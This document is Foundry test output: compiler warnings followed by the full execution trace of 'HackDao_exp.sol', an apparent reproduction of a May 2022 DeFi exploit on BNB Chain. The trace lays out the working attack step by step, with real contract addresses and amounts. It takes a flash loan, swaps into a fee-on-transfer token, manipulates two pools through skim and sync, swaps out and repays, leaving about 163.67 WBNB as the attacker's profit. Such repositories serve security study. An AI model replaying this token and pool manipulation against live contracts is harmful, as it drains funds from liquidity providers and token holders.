Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.23s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-05/HackDao_exp.sol:14:5:
   |
14 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    тФЬтФА [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 232.72ms (139.61┬╡s CPU time)

Ran 1 test for src/test/2022-05/HackDao_exp.sol:ContractTest
[PASS] testExploit() (gas: 515025)
Logs:
  [End] Attacker WBNB balance after exploit: 163.673482526496579211

Traces:
  [577225] ContractTest::testExploit()
    тФЬтФА [24420] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФФтФА тЖР [Return] true
    тФЬтФА [25295] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФФтФА тЖР [Return] true
    тФЬтФА [506180] 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4::flashLoan(1900000000000000000000 [1.9e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    тФВ   тФЬтФА [29962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1900000000000000000000 [1.9e21])
    тФВ   тФВ   тФЬтФА emit Transfer(from: 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1900000000000000000000 [1.9e21])
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФЬтФА [449792] ContractTest::DPPFlashLoanCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1900000000000000000000 [1.9e21], 0, 0x00)
    тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1900000000000000000000 [1.9e21]
    тФВ   тФВ   тФЬтФА [211542] 0x10ED43C718714eb63d5aA57B78B54704E256024E::swapExactTokensForTokensSupportingFeeOnTransferTokens(1900000000000000000000 [1.9e21], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1653374627 [1.653e9])
    тФВ   тФВ   тФВ   тФЬтФА [8225] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, 1900000000000000000000 [1.9e21])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, value: 1900000000000000000000 [1.9e21])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [2930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФВ   тФВ   тФЬтФА [2893] 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 11335604931335159291659 [1.133e22], 196806251218251435779 [1.968e20], 1653292626 [1.653e9]
    тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 2096806251218251435779 [2.096e21]
    тФВ   тФВ   тФВ   тФЬтФА [186338] 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2::swap(10269229249262517377464 [1.026e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [151562] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10269229249262517377464 [1.026e22])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 410769169970500695098 [4.107e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0x46531eb39B22fC37536B9Da97B75Bad0dBed5e26, value: 821538339941001390197 [8.215e20])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xea04ee1e9377F6024ab4CA9939857fed24246c99, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0x6FB9431985a284bb7B14f3b1079f13Fb7Cfa9f3f, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0x1458b2E4A2524859dC324B6E6442a0a2F3FDFF0B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xDf9c2fdb13910105BE13578823c914Ec020249A0, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0x12f9dCf61082F9cD82153474212328c0c7969B6F, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xA7E85DaAE8B876840D9745501329fb1767fD47Cc, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xb87230a8169366051b1732DfB4687F2A041564cf, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 9036921739351015292169 [9.036e21])
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1066375682072641914195 [1.066e21]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 2096806251218251435779 [2.096e21]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 1066375682072641914195 [1.066e21], reserve1: 2096806251218251435779 [2.096e21])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0In: 0, amount1In: 1900000000000000000000 [1.9e21], amount0Out: 10269229249262517377464 [1.026e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФЬтФА [930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 9036921739351015292169 [9.036e21]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 9036921739351015292169 [9.036e21]
    тФВ   тФВ   тФЬтФА [38668] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::transfer(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, 9036921739351015292169 [9.036e21])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ECRecover: [0x0000000000000000000000000000000000000001], value: 361476869574040611686 [3.614e20])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x46531eb39B22fC37536B9Da97B75Bad0dBed5e26, value: 722953739148081223373 [7.229e20])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, value: 0)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xea04ee1e9377F6024ab4CA9939857fed24246c99, value: 0)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6FB9431985a284bb7B14f3b1079f13Fb7Cfa9f3f, value: 0)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x1458b2E4A2524859dC324B6E6442a0a2F3FDFF0B, value: 0)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xDf9c2fdb13910105BE13578823c914Ec020249A0, value: 0)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x12f9dCf61082F9cD82153474212328c0c7969B6F, value: 0)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xA7E85DaAE8B876840D9745501329fb1767fD47Cc, value: 0)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, value: 7952491130628893457109 [7.952e21])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [62243] 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2::skim(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225)
    тФВ   тФВ   тФВ   тФЬтФА [930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 9018866812701535371304 [9.018e21]
    тФВ   тФВ   тФВ   тФЬтФА [48050] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::transfer(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, 7952491130628893457109 [7.952e21])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 318099645225155738284 [3.18e20])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0x46531eb39B22fC37536B9Da97B75Bad0dBed5e26, value: 636199290450311476568 [6.361e20])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xea04ee1e9377F6024ab4CA9939857fed24246c99, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0x6FB9431985a284bb7B14f3b1079f13Fb7Cfa9f3f, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0x1458b2E4A2524859dC324B6E6442a0a2F3FDFF0B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xDf9c2fdb13910105BE13578823c914Ec020249A0, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0x12f9dCf61082F9cD82153474212328c0c7969B6F, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xA7E85DaAE8B876840D9745501329fb1767fD47Cc, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xb87230a8169366051b1732DfB4687F2A041564cf, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, value: 7952491130628893457109 [7.952e21])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 2096806251218251435779 [2.096e21]
    тФВ   тФВ   тФВ   тФЬтФА [5262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [9376] 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2::sync()
    тФВ   тФВ   тФВ   тФЬтФА [930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 112076746397174699342 [1.12e20]
    тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 2096806251218251435779 [2.096e21]
    тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 112076746397174699342 [1.12e20], reserve1: 2096806251218251435779 [2.096e21])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [65375] 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225::skim(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2)
    тФВ   тФВ   тФВ   тФЬтФА [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 1226350692482440982521 [1.226e21]
    тФВ   тФВ   тФВ   тФЬтФА [5271] 0x55d398326f99059fF775485246999027B3197955::transfer(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 8197736394584921765740 [8.197e21]
    тФВ   тФВ   тФВ   тФЬтФА [38676] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::transfer(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, 7952491130628893457109 [7.952e21])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 318099645225155738284 [3.18e20])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0x46531eb39B22fC37536B9Da97B75Bad0dBed5e26, value: 636199290450311476568 [6.361e20])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0xea04ee1e9377F6024ab4CA9939857fed24246c99, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0x6FB9431985a284bb7B14f3b1079f13Fb7Cfa9f3f, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0x1458b2E4A2524859dC324B6E6442a0a2F3FDFF0B, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0xDf9c2fdb13910105BE13578823c914Ec020249A0, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0x12f9dCf61082F9cD82153474212328c0c7969B6F, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0xA7E85DaAE8B876840D9745501329fb1767fD47Cc, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0xb87230a8169366051b1732DfB4687F2A041564cf, value: 0)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225, to: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, value: 6998192194953426242256 [6.998e21])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [893] 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2::getReserves() [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 112076746397174699342 [1.12e20], 2096806251218251435779 [2.096e21], 1653374627 [1.653e9]
    тФВ   тФВ   тФЬтФА [930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 7110268941350600941598 [7.11e21]
    тФВ   тФВ   тФЬтФА [38654] 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2::swap(0, 2063673482526496579211 [2.063e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    тФВ   тФВ   тФВ   тФЬтФА [23162] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2063673482526496579211 [2.063e21])
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2063673482526496579211 [2.063e21])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФЬтФА [930] 0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 7110268941350600941598 [7.11e21]
    тФВ   тФВ   тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2) [staticcall]
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 33132768691754856568 [3.313e19]
    тФВ   тФВ   тФВ   тФЬтФА emit Sync(reserve0: 7110268941350600941598 [7.11e21], reserve1: 33132768691754856568 [3.313e19])
    тФВ   тФВ   тФВ   тФЬтФА emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 6998192194953426242256 [6.998e21], amount1In: 0, amount0Out: 0, amount1Out: 2063673482526496579211 [2.063e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [3262] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, 1900000000000000000000 [1.9e21])
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4, value: 1900000000000000000000 [1.9e21])
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 2696894035621218830696 [2.696e21]
    тФВ   тФЬтФА [2531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 843026509435895071858957 [8.43e23]
    тФВ   тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 2696894035621218830696 [2.696e21]
    тФВ   тФЬтФА [531] 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56::balanceOf(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) [staticcall]
    тФВ   тФВ   тФФтФА тЖР [Return] 843026509435895071858957 [8.43e23]
    тФВ   тФЬтФА emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 1900000000000000000000 [1.9e21], : 0)
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФФтФА тЖР [Return] 163673482526496579211 [1.636e20]
    тФЬтФА emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 163673482526496579211 [1.636e20], decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.35s (3.08s CPU time)

Ran 2 test suites in 3.35s (3.58s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
